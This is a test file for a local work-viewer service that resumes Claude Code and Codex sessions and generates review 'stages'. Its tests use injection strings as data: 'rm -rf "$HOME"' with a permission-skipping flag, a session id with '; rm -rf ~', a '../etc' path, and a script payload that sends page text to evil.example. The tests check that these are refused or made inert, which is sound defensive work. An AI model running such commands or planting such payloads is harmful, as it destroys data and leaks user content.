import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import { Database } from 'bun:sqlite';
import express from 'express';
import { EventEmitter } from 'node:events';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, dirname, join } from 'node:path';
import type { Server } from 'node:http';
import { STAGE_CONTENT_SECURITY_POLICY, WorkViewRoutes } from '../../../../src/services/worker/http/routes/WorkViewRoutes.js';
import type { AgentRunResult, AgentTask } from '../../../../src/services/agent-runner/run.js';
import type { UsableAgent } from '../../../../src/services/agent-runner/detect.js';
import { applyGroupDecisions, groupIdFor, runCli } from '../../../../src/services/work-view/request-groups.mjs';
import { focusAreaRowFields, placementRowFields } from '../../../../src/services/work-view/my-focus.mjs';
import { isInsideDeliverablesDir } from '../../../../src/shared/deliverables.js';
import { createDeliverablesSchema, recordDeliverable } from '../../../../src/services/sqlite/deliverables.js';
import { toWorkModel } from '../../../../src/ui/my-work/src/live/to-work-model.js';
import { chatLinks, requestChat } from '../../../../src/ui/my-work/src/live/chat-links.js';

const SESSION = '6f1c2a9e-4b7d-4e0a-9c35-2d8f7a1b0c11';
const PLUGIN_ROOT = join(import.meta.dir, '../../../../plugin');
/** Text a shell or a flag parser would act on; it must reach the tool as stdin and nothing else. */
const HOSTILE = '--dangerously-skip-permissions; rm -rf "$HOME" $(whoami) `id`\n-p \'second line\'';
const ASK = 'Build a local work viewer so I can answer an agent from the board';

let directory: string;
let ledgerDir: string;
let sessionCwd: string;
let source: Database;
let routes: WorkViewRoutes;
let server: Server;
let origin: string;
let nextRow: number;
let tokens = 0;
const token = () => `click-${String(++tokens).padStart(6, '0')}`;

interface Spawned { command: string; args: string[]; cwd: string | undefined; env: NodeJS.ProcessEnv | undefined; stdin: string }
/** A spawn that records exactly what it was given and exits with `exitCode` on the next tick. */
function fakeSpawn(exitCode: number | 'ENOENT' = 0, stderr = '') {
  const calls: Spawned[] = [];
  const spawn = ((command: string, args: string[], options: { cwd?: string; env?: NodeJS.ProcessEnv }) => {
    const call: Spawned = { command, args, cwd: options.cwd, env: options.env, stdin: '' };
    calls.push(call);
    const child = new EventEmitter() as any;
    const stream = () => Object.assign(new EventEmitter(), { setEncoding() {} });
    child.stdout = stream(); child.stderr = stream();
    child.stdin = { on() {}, end(text: string) { call.stdin = text; } };
    setTimeout(() => {
      if (exitCode === 'ENOENT') { child.emit('error', Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' })); return; }
      if (stderr) child.stderr.emit('data', stderr);
      child.emit('close', exitCode);
    }, 1);
    return child;
  }) as any;
  return { calls, spawn };
}

/** The shared runner's contract, without an agent: it prepares, runs the task once with `answer`, and never throws. */
function fakeAgent(firstAnswer: string, failure: string | null = null) {
  let answer = firstAnswer;
  const calls: Array<{ task: AgentTask; prompts: string[] }> = [];
  const run = async (task: AgentTask): Promise<AgentRunResult> => {
    const call = { task, prompts: [] as string[] };
    calls.push(call);
    const failed = (error: string): AgentRunResult => ({ state: 'failed', agent: 'claude-code', result: null, error, attempts: [{ agent: 'claude-code', error }] });
    if (failure) return failed(failure);
    try {
      await task.prepare?.();
      const result = await task.run(async prompt => { call.prompts.push(prompt); return answer; }, 'claude-code');
      return { state: 'ok', agent: 'claude-code', result, error: null, attempts: [] };
    } catch (error) { return failed(`Claude Code: ${(error as Error).message}`); }
  };
  return { calls, run, answer: (next: string) => { answer = next; } };
}

const agents = (change: Partial<Record<'claude-code' | 'codex', Partial<UsableAgent>>> = {}) => async (): Promise<UsableAgent[]> => [
  { id: 'claude-code', path: '/fake/bin/claude', authenticated: true, reason: 'logged in', ...change['claude-code'] },
  { id: 'codex', path: '/fake/bin/codex', authenticated: true, reason: 'logged in', ...change.codex },
  { id: 'gemini', path: null, authenticated: false, reason: 'not installed' },
];

const conversation = (platform: string, sessionId: string) => JSON.stringify(['conversation', platform, sessionId]);

/** `askedAt` is when the owner wrote in it; null records the conversation with no time at all. */
function addConversation(id: number, platform: string, sessionId: string, cwd: string | null, ask = ASK, askedAt: number | null = Date.now() - 1000) {
  source.prepare('INSERT INTO sdk_sessions (id, project, platform_source, content_session_id, memory_session_id, user_prompt, status, started_at_epoch, cwd) VALUES (?,?,?,?,?,?,?,?,?)')
    .run(id, 'example-project', platform, sessionId, `memory-${id}`, ask, 'active', askedAt, cwd);
  if (askedAt !== null) source.prepare('INSERT INTO user_prompts (id, session_db_id, prompt_number, prompt_text, created_at_epoch) VALUES (?,?,1,?,?)').run(id, id, ask, askedAt);
}

/** Scratch transcript folders, so no test reads the real ones. */
const transcriptRoots = () => ({ claudeProjectsDir: join(directory, 'claude-projects'), codexHome: join(directory, 'codex') });

/** A Claude Code transcript whose agent answered and ended its turn a minute ago: the chat waits on the owner. */
function endClaudeTurn(sessionId: string) {
  const at = (ago: number) => new Date(Date.now() - ago).toISOString();
  mkdirSync(join(transcriptRoots().claudeProjectsDir, '-project'), { recursive: true });
  writeFileSync(join(transcriptRoots().claudeProjectsDir, '-project', `${sessionId}.jsonl`), [
    { type: 'user', isSidechain: false, message: { role: 'user', content: ASK }, timestamp: at(120_000), origin: { kind: 'human' } },
    { type: 'assistant', isSidechain: false, message: { role: 'assistant', content: [{ type: 'text', text: 'Done. Have a look.' }], stop_reason: 'end_turn' }, timestamp: at(60_000) },
  ].map(record => `${JSON.stringify(record)}\n`).join(''));
}

/** One overall request made of these conversations, as a refresh would group them. */
function groupTogether(keys: string[]) {
  writeFileSync(join(ledgerDir, 'request-groups.json'), JSON.stringify(applyGroupDecisions(null, { groups: [{ title: 'Viewer', conversations: keys,
    links: [{ kind: 'agent-judgment', conversations: keys, evidence: 'continues the viewer' }] }] }, Date.now())));
}

/** Groups the conversation into an overall request, as a refresh would, with an optional progress review. */
function group(key: string, review: Record<string, unknown> | null = null): string {
  const groupsPath = join(ledgerDir, 'request-groups.json');
  const stored = existsSync(groupsPath) ? JSON.parse(readFileSync(groupsPath, 'utf8')) : null;
  writeFileSync(groupsPath, JSON.stringify(applyGroupDecisions(stored, { groups: [{ title: 'Local work viewer', conversations: [key] }] }, Date.now())));
  const groupId = groupIdFor(key);
  if (review) {
    mkdirSync(join(ledgerDir, 'progress'), { recursive: true });
    writeFileSync(join(ledgerDir, 'progress', `${groupId}.json`), JSON.stringify({
      groupId, state: 'shipped', percent: 100, summary: 'The viewer is built.', milestones: [], preferences: [], evidence: [],
      startedAt: null, shippedAt: new Date().toISOString(), lastActivityAt: null, reviewedConversations: [key], readings: [], ...review,
    }));
  }
  return groupId;
}

async function start(options: ConstructorParameters<typeof WorkViewRoutes>[0] = {}) {
  routes = new WorkViewRoutes({
    databasePath: join(directory, 'source.db'), reviewPath: join(directory, 'review.db'), pollIntervalMs: 20, humanCopy: null, ledgerDir,
    homeProject: 'home', rulesFilePath: join(directory, 'MY-RULES.md'), claudeInstructionsPath: join(directory, 'claude', 'CLAUDE.md'),
    settingsPath: join(directory, 'settings.json'), setupStatePath: join(directory, 'setup.json'), focusShares: null, pluginRoot: PLUGIN_ROOT,
    detectAgents: agents(), spawnImpl: fakeSpawn().spawn, runAgent: fakeAgent('').run, transcriptRoots: transcriptRoots(),
    appendWorkStateEntry: ({ project, listName, fields }) => {
      source.prepare('INSERT INTO work_state_entries (id, project, list_name, fields, created_at_epoch) VALUES (?, ?, ?, ?, ?)').run(nextRow++, project, listName, JSON.stringify(fields), Date.now() + nextRow);
    },
    ...options,
  });
  const app = express();
  // The worker's own body limit (createMiddleware in http/middleware.ts).
  app.use(express.json({ limit: '5mb' }));
  routes.setupRoutes(app);
  await new Promise<void>(resolve => { server = app.listen(0, '127.0.0.1', resolve); });
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('No test port');
  origin = `http://127.0.0.1:${address.port}`;
}

async function stop() {
  await routes.whenOwnerRunsSettle();
  routes.close();
  await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
}

beforeEach(() => {
  directory = mkdtempSync(join(tmpdir(), 'work-view-owner-runs-'));
  ledgerDir = join(directory, 'work-view');
  sessionCwd = join(directory, 'checkout');
  mkdirSync(ledgerDir);
  mkdirSync(sessionCwd);
  source = new Database(join(directory, 'source.db'));
  source.exec('PRAGMA journal_mode=WAL');
  source.exec(`
    CREATE TABLE work_state_entries (id INTEGER PRIMARY KEY, project TEXT, list_name TEXT, fields TEXT, created_at_epoch INTEGER, origin_device_id TEXT, origin_local_id TEXT);
    CREATE TABLE sdk_sessions (id INTEGER PRIMARY KEY, project TEXT, platform_source TEXT, content_session_id TEXT, memory_session_id TEXT,
      user_prompt TEXT, custom_title TEXT, status TEXT, started_at_epoch INTEGER, completed_at_epoch INTEGER, cwd TEXT);
    CREATE TABLE user_prompts (id INTEGER PRIMARY KEY, session_db_id INTEGER, prompt_number INTEGER, prompt_text TEXT, created_at_epoch INTEGER);
    CREATE TABLE tool_uses (id INTEGER PRIMARY KEY, session_db_id INTEGER, prompt_number INTEGER, tool_name TEXT, tool_input TEXT, tool_response TEXT, created_at_epoch INTEGER);
    CREATE TABLE observations (id INTEGER PRIMARY KEY, memory_session_id TEXT, type TEXT, title TEXT, subtitle TEXT, created_at_epoch INTEGER);
  `);
  nextRow = 1;
});

afterEach(async () => {
  await stop();
  source.close();
  rmSync(directory, { recursive: true, force: true });
});

const post = (path: string, body: unknown, headers: Record<string, string> = {}) => fetch(`${origin}${path}`, {
  method: 'POST', headers: { 'Content-Type': 'application/json', Origin: origin, ...headers }, body: JSON.stringify(body),
});
const view = async () => (await fetch(`${origin}/api/work-view`)).json() as Promise<any>;
const onlyRequest = async () => (await view()).humanRequests[0];
const ownerRuns = () => JSON.parse(readFileSync(join(ledgerDir, 'owner-runs.json'), 'utf8'));
const myFocusRows = () => source.prepare("SELECT COUNT(*) AS count FROM work_state_entries WHERE list_name = 'my-focus'").get() as { count: number };

describe('POST /api/work-view/answer', () => {
  it('resumes the request\'s Claude Code session with the answer on stdin, and nothing of it in the arguments', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    const request = await onlyRequest();
    const response = await post('/api/work-view/answer', { requestId: request.id, text: HOSTILE, token: token() });
    expect(response.status).toBe(202);
    expect(await response.json()).toEqual({ state: 'started' });
    expect((await onlyRequest()).answer.state).toBe('answering');
    await routes.whenOwnerRunsSettle();
    expect(tool.calls).toHaveLength(1);
    expect(tool.calls[0].command).toBe('/fake/bin/claude');
    expect(tool.calls[0].args).toEqual(['--resume', SESSION, '-p']);
    expect(tool.calls[0].cwd).toBe(sessionCwd);
    expect(tool.calls[0].stdin).toBe(HOSTILE);
    // The turn is the owner's own: it is not marked as a claude-mem internal run, so normal capture records it.
    expect(tool.calls[0].env?.CLAUDE_MEM_INTERNAL).toBeUndefined();
    expect((await onlyRequest()).answer).toMatchObject({ state: 'delivered', error: null, platform: 'claude' });
  });

  it('resumes a Codex session with `exec resume <id> -`, the answer on stdin', async () => {
    addConversation(1, 'codex', SESSION, sessionCwd);
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    expect((await post('/api/work-view/answer', { requestId: (await onlyRequest()).id, text: HOSTILE, token: token() })).status).toBe(202);
    await routes.whenOwnerRunsSettle();
    expect(tool.calls.map(call => [call.command, call.args, call.stdin])).toEqual([['/fake/bin/codex', ['exec', 'resume', SESSION, '-'], HOSTILE]]);
  });

  it('answers, reads the turn of and links the chat whose owner wrote last, whatever the order of its keys', async () => {
    const olderCodex = '01a18a2e-1d34-4721-8fc0-65a66071db9e';
    const hour = 3_600_000;
    addConversation(1, 'claude', SESSION, sessionCwd, ASK, Date.now() - hour);
    addConversation(2, 'codex', olderCodex, sessionCwd, 'Start the board', Date.now() - 200 * hour);
    groupTogether([conversation('claude', SESSION), conversation('codex', olderCodex)]);
    endClaudeTurn(SESSION);
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    const snapshot = await view();
    const request = snapshot.humanRequests[0];
    expect(request.conversationKeys.at(-1)).toBe(conversation('codex', olderCodex));
    expect(request.latestConversationKey).toBe(conversation('claude', SESSION));
    expect(request.turn).toMatchObject({ state: 'owner-turn', reason: 'turn-ended' });
    expect(chatLinks(requestChat(toWorkModel(snapshot, Date.now()).requests[0]))?.openHref).toBe(`claude://resume?session=${SESSION}`);
    expect((await post('/api/work-view/answer', { requestId: request.id, text: 'Keep the linear forecast.', token: token() })).status).toBe(202);
    await routes.whenOwnerRunsSettle();
    expect(tool.calls.map(call => call.args)).toEqual([['--resume', SESSION, '-p']]);
  });

  it('with several chats and no recorded time to tell the latest, names none: no link, and the answer is refused unsent', async () => {
    const other = '01a18a2e-1d34-4721-8fc0-65a66071db9e';
    addConversation(1, 'claude', SESSION, sessionCwd, ASK, null);
    addConversation(2, 'codex', other, sessionCwd, 'Start the board', null);
    groupTogether([conversation('claude', SESSION), conversation('codex', other)]);
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    const snapshot = await view();
    const request = snapshot.humanRequests[0];
    expect(request.conversationKeys).toHaveLength(2);
    expect(request.latestConversationKey).toBeNull();
    expect(request.turn).toBeUndefined();
    expect(chatLinks(requestChat(toWorkModel(snapshot, Date.now()).requests[0]))).toBeUndefined();
    const response = await post('/api/work-view/answer', { requestId: request.id, text: 'yes', token: token() });
    expect(response.status).toBe(409);
    expect(await response.json()).toMatchObject({ refusal: true, error: expect.stringMatching(/several chats and no recorded time/) });
    expect(tool.calls).toEqual([]);
  });

  it('refuses, and starts nothing, when the session id is not a UUID, the tool is another one, it is not installed, or its folder is gone', async () => {
    const cases: Array<[string, string, string | null, Parameters<typeof agents>[0], RegExp]> = [
      ['claude', `${SESSION}; rm -rf ~`, sessionCwd, {}, /no id that can be resumed/],
      ['claude', '--help', sessionCwd, {}, /no id that can be resumed/],
      ['gemini', SESSION, sessionCwd, {}, /Claude Code and Codex sessions only/],
      ['claude', SESSION, sessionCwd, { 'claude-code': { path: null } }, /not installed/],
      ['codex', SESSION, sessionCwd, { codex: { authenticated: false, reason: 'logged out' } }, /not logged in/],
      ['claude', SESSION, join(directory, 'deleted-worktree'), {}, /folder .* is not on this computer/],
      ['claude', SESSION, null, {}, /folder .* is not on this computer/],
    ];
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    for (const [index, [platform, sessionId, cwd, detected, reason]] of cases.entries()) {
      await stop();
      source.exec('DELETE FROM sdk_sessions; DELETE FROM user_prompts;');
      addConversation(index + 1, platform, sessionId, cwd);
      await start({ spawnImpl: tool.spawn, detectAgents: agents(detected) });
      const response = await post('/api/work-view/answer', { requestId: (await onlyRequest()).id, text: 'yes', token: token() });
      expect(response.status).toBe(409);
      const body = await response.json() as { error: string; refusal: boolean };
      expect(body.refusal).toBe(true);
      expect(body.error).toMatch(reason);
    }
    expect(tool.calls).toEqual([]);
    expect(existsSync(join(ledgerDir, 'owner-runs.json'))).toBe(false);
  });

  it('never starts a second run for the same click, sent again or twice at once', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    const body = { requestId: (await onlyRequest()).id, text: 'yes', token: token() };
    const together = await Promise.all([post('/api/work-view/answer', body), post('/api/work-view/answer', body)]);
    expect((await Promise.all(together.map(response => response.json()))).map(answer => (answer as { state: string }).state).sort()).toEqual(['duplicate', 'started']);
    await routes.whenOwnerRunsSettle();
    const again = await post('/api/work-view/answer', body);
    expect(again.status).toBe(200);
    expect(await again.json()).toEqual({ state: 'duplicate' });
    await routes.whenOwnerRunsSettle();
    expect(tool.calls).toHaveLength(1);
  });

  it('a failed delivery is recorded as failed and creates no later run, not on a later read and not after a restart', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const tool = fakeSpawn(1, 'You have hit your session limit · resets 2:30pm');
    await start({ spawnImpl: tool.spawn });
    const requestId = (await onlyRequest()).id;
    await post('/api/work-view/answer', { requestId, text: 'yes', token: token() });
    await routes.whenOwnerRunsSettle();
    expect((await onlyRequest()).answer).toMatchObject({ state: 'failed', error: expect.stringMatching(/exited 1: You have hit your session limit/) });
    await Bun.sleep(80);
    await view();
    await stop();
    await start({ spawnImpl: tool.spawn });
    await Bun.sleep(80);
    expect((await onlyRequest()).answer.state).toBe('failed');
    expect(tool.calls).toHaveLength(1);
  });

  it('reports a tool that could not start, and marks an answer cut off by a restart as failed without sending it again', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const missing = fakeSpawn('ENOENT');
    await start({ spawnImpl: missing.spawn });
    const requestId = (await onlyRequest()).id;
    await post('/api/work-view/answer', { requestId, text: 'yes', token: token() });
    await routes.whenOwnerRunsSettle();
    expect((await onlyRequest()).answer).toMatchObject({ state: 'failed', error: expect.stringMatching(/could not start/) });
    await stop();
    const file = ownerRuns();
    // A worker that died mid-delivery: a pid no process has.
    file.answers[requestId] = { ...file.answers[requestId], state: 'answering', error: null, finishedAt: null, pid: 2 ** 30 };
    writeFileSync(join(ledgerDir, 'owner-runs.json'), JSON.stringify(file));
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    expect((await onlyRequest()).answer).toMatchObject({ state: 'failed', error: expect.stringMatching(/Nothing was retried/) });
    expect(tool.calls).toEqual([]);
  });

  it('is a loopback write from the viewer\'s own page with a strict body', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const tool = fakeSpawn(0);
    await start({ spawnImpl: tool.spawn });
    const requestId = (await onlyRequest()).id;
    expect((await post('/api/work-view/answer', { requestId, text: 'yes', token: token() }, { Origin: 'https://evil.example' })).status).toBe(403);
    expect((await post('/api/work-view/answer', { requestId, text: 'yes', token: token() }, { 'X-Forwarded-For': '203.0.113.9' })).status).toBe(403);
    for (const body of [{ requestId, text: 'yes', token: 'short' }, { requestId, text: '   ', token: token() }, { requestId, text: 'x'.repeat(8001), token: token() },
      { requestId, text: 'yes', token: token(), argv: ['--dangerously-skip-permissions'] }, { requestId, text: 'yes' }]) {
      expect((await post('/api/work-view/answer', body)).status).toBe(400);
    }
    expect((await post('/api/work-view/answer', { requestId: 'missing', text: 'yes', token: token() })).status).toBe(404);
    expect(tool.calls).toEqual([]);
  });
});

describe('POST /api/work-view/stage', () => {
  const key = conversation('claude', SESSION);

  it('makes one stage on the owner\'s agent, read-only, and serves it from the request\'s deliverables bucket', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const groupId = group(key, { reviewedThrough: '2026-11-10T10:00:00.000Z', checkedAt: '2026-11-10T10:00:01.000Z' });
    const agent = fakeAgent('```markdown\n# Brief\n\n> Build a local work viewer\n\nNothing visual was recorded for this request.\n```');
    const recorded: any[] = [];
    createDeliverablesSchema(source);
    await start({ runAgent: agent.run, recordDeliverable: input => { recorded.push(input); return recordDeliverable(source, input); } });
    const request = await onlyRequest();
    expect(request.groupId).toBe(groupId);
    const response = await post('/api/work-view/stage', { requestId: request.id, formatId: 'brief', token: token() });
    expect(response.status).toBe(202);
    expect(await response.json()).toEqual({ state: 'started' });
    await routes.whenOwnerRunsSettle();

    expect(agent.calls).toHaveLength(1);
    const { task, prompts } = agent.calls[0];
    expect(task.stayOnFirstUsableAgent).toBe(true);
    expect(task.claudeCode.tools).toEqual(['Read', 'Grep', 'Glob']);
    expect(task.claudeCode.readableFolders).toEqual([ledgerDir]);
    expect(prompts).toHaveLength(1);
    expect(prompts[0]).toContain('# Review Stage');
    expect(prompts[0]).toContain('Format: Brief.');
    expect(prompts[0]).toContain('No evidence file could be opened for this request.');

    const stage = (await onlyRequest()).stages.brief;
    expect(stage).toMatchObject({ state: 'ready', error: null, trigger: 'owner', reviewedThrough: '2026-11-10T10:00:00.000Z' });
    expect(basename(stage.file)).toBe(`stage-${groupId}-brief.md`);
    expect(isInsideDeliverablesDir(stage.file)).toBe(true);
    expect(readFileSync(stage.file, 'utf8')).toBe('# Brief\n\n> Build a local work viewer\n\nNothing visual was recorded for this request.');
    expect(stage.url).toBe(`/api/deliverables/1/stage-${groupId}-brief.md`);
    const served = await fetch(`${origin}${stage.url}`);
    expect(served.status).toBe(200);
    expect(await served.text()).toBe(readFileSync(stage.file, 'utf8'));
    expect(served.headers.get('content-type')).toBe('text/plain; charset=utf-8');
    expect(served.headers.get('content-security-policy')).toBe(STAGE_CONTENT_SECURITY_POLICY);
    // A stage reviews the work; it is never listed as the request's own work product.
    expect((await onlyRequest()).workProduct ?? []).toEqual([]);
    expect(recorded).toHaveLength(1);
    expect(recorded[0]).toMatchObject({ kind: 'stage', bucketPath: stage.file, platformSource: 'claude', contentSessionId: SESSION });
    // The run's input files are gone once it ends.
    expect(readdirSync(join(ledgerDir, 'agent-runs'))).toEqual([]);

    const overview = await (await fetch(`${origin}/api/work-view/overview`)).json() as any;
    const row = overview.model.requests[0];
    expect(row.stages).toBeUndefined();
    const detail = await (await fetch(`${origin}/api/work-view/requests/${encodeURIComponent(row.id)}`)).json() as any;
    expect(detail.request.stages).toEqual([{ formatId: 'brief', state: 'ready', href: stage.url, error: null, outdated: false }]);
    rmSync(stage.file, { force: true });
  });

  it('reads the whole request for a stage, though its review is current and an update would be empty', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    source.prepare('INSERT INTO observations (id, memory_session_id, type, title, subtitle, created_at_epoch) VALUES (1, ?, ?, ?, ?, ?)').run('memory-1', 'feature', 'Board built', 'The work behind the review', Date.now() - 500);
    // The review was saved a moment ago and covers everything: exactly when automatic staging runs.
    const groupId = group(key, { state: 'in-progress', percent: 100, shippedAt: null, reviewedThrough: new Date().toISOString(), checkedAt: new Date().toISOString() });
    let show: any = null;
    const runAgent = async (task: AgentTask): Promise<AgentRunResult> => {
      await task.prepare?.();
      const result = await task.run(async prompt => {
        show = JSON.parse(readFileSync(/The request \(the `show` output\) is in (\S+)\. /.exec(prompt)![1], 'utf8'));
        return '# Brief';
      }, 'claude-code');
      return { state: 'ok', agent: 'claude-code', result, error: null, attempts: [] };
    };
    await start({ runAgent });
    // What the reviewer's own update read would hold: nothing since the review.
    let update: any = null;
    const database = new Database(join(directory, 'source.db'), { readonly: true });
    runCli(['show', groupId], { dir: ledgerDir, database, now: Date.now(), print: (value: unknown) => { update = value; }, localDeviceId: '' });
    database.close();
    expect(update.mode).toBe('amend');
    expect(update.conversations[0].asks).toEqual([]);
    expect(update.conversations[0].observations).toEqual([]);

    await post('/api/work-view/stage', { requestId: (await onlyRequest()).id, formatId: 'brief', token: token() });
    await routes.whenOwnerRunsSettle();
    expect((await onlyRequest()).stages.brief.state).toBe('ready');
    expect(show.mode).toBe('full');
    expect(show.conversations[0].asks.map((ask: { text: string }) => ask.text)).toEqual([ASK]);
    expect(show.conversations[0].observations.map((observation: { title: string }) => observation.title)).toEqual(['Board built']);
    expect(show.previousReview.percent).toBe(100);
    rmSync((await onlyRequest()).stages.brief.file, { force: true });
  });

  it('never starts a second run for the same click, and refuses a second click while the stage is being made', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    group(key);
    let release!: () => void;
    const gate = new Promise<void>(resolve => { release = resolve; });
    const agent = fakeAgent('# Brief');
    const calls: AgentTask[] = [];
    await start({ runAgent: async task => { calls.push(task); await gate; return agent.run(task); } });
    const body = { requestId: (await onlyRequest()).id, formatId: 'brief', token: token() };
    expect((await (await post('/api/work-view/stage', body)).json() as any).state).toBe('started');
    expect((await onlyRequest()).stages.brief.state).toBe('generating');
    expect(await (await post('/api/work-view/stage', body)).json()).toEqual({ state: 'duplicate' });
    expect((await post('/api/work-view/stage', { ...body, token: token() })).status).toBe(409);
    release();
    await routes.whenOwnerRunsSettle();
    expect(await (await post('/api/work-view/stage', body)).json()).toEqual({ state: 'duplicate' });
    await routes.whenOwnerRunsSettle();
    expect(calls).toHaveLength(1);
    rmSync((await onlyRequest()).stages.brief.file, { force: true });
  });

  it('a failed run leaves the stage failed with its reason and creates no later run', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    group(key);
    const agent = fakeAgent('', 'Claude Code: Claude Code run failed (error): You have hit your session limit');
    await start({ runAgent: agent.run });
    await post('/api/work-view/stage', { requestId: (await onlyRequest()).id, formatId: 'technical', token: token() });
    await routes.whenOwnerRunsSettle();
    expect((await onlyRequest()).stages.technical).toMatchObject({ state: 'failed', file: null, url: null, error: expect.stringMatching(/session limit/) });
    await Bun.sleep(80);
    await stop();
    await start({ runAgent: agent.run });
    await Bun.sleep(80);
    expect((await onlyRequest()).stages.technical.state).toBe('failed');
    expect(agent.calls).toHaveLength(1);
  });

  it('refuses a stage that points at evidence the worker never gathered', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    group(key);
    const agent = fakeAgent('# Brief\n\n![the new board](evidence:E7)');
    await start({ runAgent: agent.run });
    await post('/api/work-view/stage', { requestId: (await onlyRequest()).id, formatId: 'brief', token: token() });
    await routes.whenOwnerRunsSettle();
    expect((await onlyRequest()).stages.brief).toMatchObject({ state: 'failed', error: expect.stringMatching(/evidence that was not gathered \(E7\)/) });
    expect(agent.calls).toHaveLength(1);
  });

  it('lists the built-in formats and the owner\'s own files, and stages in an owner format', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    group(key);
    mkdirSync(join(directory, 'stage-formats'));
    writeFileSync(join(directory, 'stage-formats', 'release-note.md'), '---\nname: Release note\n---\nWrite it as a release note for customers.\n');
    writeFileSync(join(directory, 'stage-formats', 'Bad Name.md'), 'ignored');
    writeFileSync(join(directory, 'stage-formats', 'deck.md'), '---\noutput: html\n---\nMake slides.');
    const agent = fakeAgent('# Release note');
    await start({ runAgent: agent.run });
    expect((await view()).stageFormats).toEqual([
      { id: 'brief', label: 'Brief', builtIn: true }, { id: 'one-pager', label: 'One-pager', builtIn: true },
      { id: 'technical', label: 'Technical walkthrough', builtIn: true }, { id: 'release-note', label: 'Release note', builtIn: false },
    ]);
    const requestId = (await onlyRequest()).id;
    // A format file that asks for HTML is not a format: no stage is ever anything but Markdown.
    expect((await post('/api/work-view/stage', { requestId, formatId: 'deck', token: token() })).status).toBe(404);
    expect((await post('/api/work-view/stage', { requestId, formatId: '../etc', token: token() })).status).toBe(400);
    expect((await post('/api/work-view/stage', { requestId, formatId: 'release-note', token: token() })).status).toBe(202);
    await routes.whenOwnerRunsSettle();
    expect(agent.calls).toHaveLength(1);
    expect(agent.calls[0].prompts[0]).toContain('Format: Release note. Write it as a release note for customers.');
    const stage = (await onlyRequest()).stages['release-note'];
    expect(stage.state).toBe('ready');
    expect(stage.file.endsWith('-release-note.md')).toBe(true);
    rmSync(stage.file, { force: true });
  });

  it('serves a stage as inert text under a policy that sends nothing, whatever an agent wrote into it', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    group(key);
    const hostile = '<script>fetch("https://evil.example/?" + document.body.innerText)</script><img src="https://evil.example/pixel">';
    createDeliverablesSchema(source);
    await start({ runAgent: fakeAgent(hostile).run, recordDeliverable: input => recordDeliverable(source, input) });
    await post('/api/work-view/stage', { requestId: (await onlyRequest()).id, formatId: 'brief', token: token() });
    await routes.whenOwnerRunsSettle();
    const stage = (await onlyRequest()).stages.brief;
    const served = await fetch(`${origin}${stage.url}`);
    expect(served.headers.get('content-type')).toBe('text/plain; charset=utf-8');
    expect(served.headers.get('x-content-type-options')).toBe('nosniff');
    const policy = served.headers.get('content-security-policy')!;
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain("form-action 'none'");
    expect(policy).toMatch(/(^|; )sandbox($|;)/);
    expect(policy).not.toMatch(/allow-scripts|unsafe-inline|https?:/);
    // Another deliverable keeps the policy it had.
    const other = join(dirname(stage.file), 'report.html');
    writeFileSync(other, '<p>report</p>');
    const { id } = recordDeliverable(source, { project: 'example-project', contentSessionId: SESSION, platformSource: 'claude', title: 'Report', kind: 'page', sourcePath: other, bucketPath: other, bytes: 13, sha256: 'a'.repeat(64), declared: true, occurredAtEpoch: Date.now() });
    const page = await fetch(`${origin}/api/deliverables/${id}/report.html`);
    expect(page.headers.get('content-security-policy')).toBe('sandbox allow-scripts');
    rmSync(stage.file, { force: true });
    rmSync(other, { force: true });
  });

  it('refuses a request no refresh has grouped yet, and a foreign origin', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const agent = fakeAgent('# Brief');
    await start({ runAgent: agent.run });
    const requestId = (await onlyRequest()).id;
    expect((await post('/api/work-view/stage', { requestId, formatId: 'brief', token: token() })).status).toBe(409);
    expect((await post('/api/work-view/stage', { requestId, formatId: 'brief', token: token() }, { Origin: 'https://evil.example' })).status).toBe(403);
    expect(agent.calls).toEqual([]);
  });
});

describe('automatic stages (CLAUDE_MEM_WORK_VIEW_AUTO_STAGE_FORMAT)', () => {
  const key = conversation('claude', SESSION);
  const autoStage = (state: string, startedAtEpoch: number) => (routes as any).autoStage(state, startedAtEpoch) as Promise<void>;
  /** A review of work that waits for a check: finished at 100%, not shipped. My Work then offers Mark checked. */
  const IN_REVIEW = { state: 'in-progress', percent: 100, shippedAt: null };
  const recordedNow = () => ({ reviewedThrough: new Date().toISOString(), checkedAt: new Date().toISOString() });

  it('stages the request that waits for the owner\'s check, and never one that shipped', async () => {
    const shippedSession = '7a2d3b0f-5c8e-4f1b-8d46-3e9a8b2c1d22';
    addConversation(1, 'claude', SESSION, sessionCwd);
    addConversation(2, 'claude', shippedSession, sessionCwd, 'Ship the importer for the old exports');
    const before = Date.now() - 1000;
    const inReview = group(key, { ...IN_REVIEW, ...recordedNow() });
    const shipped = group(conversation('claude', shippedSession), { state: 'shipped', percent: 100, ...recordedNow() });
    writeFileSync(join(directory, 'settings.json'), JSON.stringify({ CLAUDE_MEM_WORK_VIEW_AUTO_STAGE_FORMAT: 'brief' }));
    const agent = fakeAgent('# Brief');
    await start({ runAgent: agent.run });
